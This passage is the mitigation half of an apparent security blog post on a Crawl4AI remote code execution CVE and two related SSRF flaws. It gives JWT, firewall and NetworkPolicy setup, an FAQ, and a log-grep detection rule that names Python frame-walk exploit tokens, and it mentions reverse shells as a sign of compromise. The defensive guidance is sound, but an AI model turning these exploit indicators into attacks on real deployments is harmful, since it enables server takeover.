+<p>Upgrading to 0.8.7 fixes the RCE, but it doesn&rsquo;t fix the architectural issues that made the attack possible. Here&rsquo;s the layered defense I recommend for any Crawl4AI deployment.</p>
+<h3 id="enable-jwt-authentication">Enable JWT Authentication</h3>
+<p>JWT authentication is available in Crawl4AI but disabled by default. Enable it immediately:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -d <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --name crawl4ai <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p 11235:11235 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -e CRAWL4AI_JWT_SECRET<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>openssl rand -base64 32<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  unclecode/crawl4ai:0.8.7
+</span></span></code></pre></div><p>Then include the token in all API requests:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Generate a token (server-side, not in your API calls)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The server validates the JWT automatically</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Include it in requests</span>
+</span></span><span style="display:flex;"><span>curl -X POST http://localhost:11235/crawl <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;your-jwt-token&gt;&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{&#34;urls&#34;: &#34;https://example.com&#34;}&#39;</span>
+</span></span></code></pre></div><h3 id="network-segmentation-and-firewall-rules">Network Segmentation and Firewall Rules</h3>
+<p>Do not expose Crawl4AI&rsquo;s port 11235 to the internet. It should only be accessible from your application layer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Allow only your application server</span>
+</span></span><span style="display:flex;"><span>iptables -A INPUT -p tcp --dport <span style="color:#ae81ff">11235</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -s &lt;your-app-server-ip&gt;/32 -j ACCEPT
+</span></span><span style="display:flex;"><span>iptables -A INPUT -p tcp --dport <span style="color:#ae81ff">11235</span> -j DROP
+</span></span></code></pre></div><p>If you&rsquo;re using Kubernetes, apply a NetworkPolicy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">NetworkPolicy</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">crawl4ai-ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">podSelector</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">crawl4ai</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">policyTypes</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingress</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">from</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">podSelector</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">matchLabels</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">app</span>: <span style="color:#ae81ff">your-app-server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">protocol</span>: <span style="color:#ae81ff">TCP</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">port</span>: <span style="color:#ae81ff">11235</span>
+</span></span></code></pre></div><h3 id="monitoring-and-detection">Monitoring and Detection</h3>
+<p>Qualys added detection scanner ID 5013918 on June 17, 2026. If you use Qualys, run a scan targeting your Crawl4AI hosts. For custom detection, look for:</p>
+<ul>
+<li>POST requests to <code>/crawl</code> with unusually long <code>computed_fields</code> payloads</li>
+<li>Requests containing <code>gi_frame</code>, <code>f_back</code>, or <code>f_builtins</code> in the request body</li>
+<li>Outbound connections from the Crawl4AI container to unexpected destinations</li>
+<li>Processes spawned by the <code>crawl4ai</code> user that shouldn&rsquo;t exist (shell commands, reverse shells)</li>
+</ul>
+<p>A simple log-based detection rule:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Watch for exploit attempts in real-time</span>
+</span></span><span style="display:flex;"><span>tail -f /var/log/crawl4ai/access.log | grep -E <span style="color:#e6db74">&#39;(gi_frame|f_back|f_builtins|__import__)&#39;</span>
+</span></span></code></pre></div><h2 id="related-vulnerabilities-cve-2026-53754-and-cve-2026-53755">Related Vulnerabilities: CVE-2026-53754 and CVE-2026-53755</h2>
+<p>CVE-2026-53754 (CVSS 7.5) is a Server-Side Request Forgery vulnerability that allows an attacker to make the Crawl4AI server send requests to internal network resources. CVE-2026-53755 (CVSS 8.6) is a more severe SSRF via the <code>proxy_config</code> parameter, which gives the attacker control over proxy settings and can be used to bypass network restrictions.</p>
+<p>Both are fixed in 0.8.7. The SSRF vulnerabilities are less critical than the RCE, but they expand the attack surface significantly. An attacker who can&rsquo;t reach the RCE path might still use the SSRF to probe internal services, read cloud metadata endpoints, or pivot through the network. Patch all three by upgrading to 0.8.7.</p>
+<h2 id="frequently-asked-questions">Frequently Asked Questions</h2>
+<p><strong>Does the exploit work if JWT is enabled?</strong>
+No — if JWT authentication is enabled with a strong secret, the <code>/crawl</code> endpoint requires a valid token. But JWT is disabled by default, so you must explicitly enable it.</p>
+<p><strong>Can I just block <code>gi_frame</code> and <code>f_back</code> in the AST validator instead of upgrading?</strong>
+No. The AST validator approach is fundamentally broken. Any attribute-based block can be bypassed with a different chain. The 0.8.7 fix removes <code>eval()</code> entirely, which is the only correct approach.</p>
+<p><strong>Is the Docker image the only affected deployment?</strong>
+No. Any deployment of Crawl4AI 0.8.6 or earlier is affected, whether Docker, pip, or source install. The Docker image is the most common deployment, which is why the PoC targets it.</p>
+<p><strong>Does this affect Crawl4AI&rsquo;s browser-based crawling?</strong>
+No. The vulnerability is in the computed fields evaluation, not in the browser engine. But a compromised Crawl4AI instance can be used to manipulate crawl results, which affects downstream consumers.</p>
+<p><strong>How do I check if my instance has been compromised?</strong>
+Check for unexpected processes, outbound connections, modified files in the container, and unusual entries in the crawl log. Run <code>docker exec crawl4ai ps aux</code> and look for shell processes. Check the access log for requests containing frame-walk payloads.</p>
+<h2 id="summary--act-now-to-secure-your-crawl4ai-instances">Summary — Act Now to Secure Your Crawl4AI Instances</h2>
+<p>CVE-2026-53753 is a critical vulnerability that requires immediate action. The exploit is well-documented, the PoC is public, and the fix is straightforward. Here&rsquo;s your checklist:</p>
+<ol>
+<li><strong>Upgrade to 0.8.7</strong> — this is non-negotiable. Run <code>docker pull unclecode/crawl4ai:0.8.7</code> and restart your containers.</li>
+<li><strong>Enable JWT authentication</strong> — set <code>CRAWL4AI_JWT_SECRET</code> in your environment and include the token in API requests.</li>
+<li><strong>Restrict network access</strong> — do not expose port 11235 to the internet. Use firewall rules or Kubernetes NetworkPolicies.</li>
+<li><strong>Monitor for exploitation</strong> — check your access logs for frame-walk payloads and unexpected outbound connections.</li>
+<li><strong>Audit your AI pipeline</strong> — any component that processes untrusted data is a potential injection point. Review your entire pipeline for similar vulnerabilities.</li>
+</ol>
+<p>The broader lesson here applies to every AI tool you run: sandboxing untrusted code with AST validation is a known-failed approach. If your tool evaluates user-supplied expressions, check whether it uses <code>eval()</code> behind an AST validator. If it does, that&rsquo;s a vulnerability waiting to be discovered. I covered similar trust-boundary issues in my <a href="/posts/clean-repo-prompt-injection-defense-guide-2026/">Clean Repo Prompt Injection Defense Guide 2026</a> and <a href="/posts/agentjacking-mitigation-guide-2026/">Agentjacking Mitigation Guide 2026</a> — the pattern is always the same: trust assumptions in data processing create exploitable gaps.</p>
+<p>Upgrade your Crawl4AI instances today. The fix takes five minutes, and the alternative is a CVSS 9.8 RCE on your network.</p>
+]]></content:encoded></item></channel></rss>
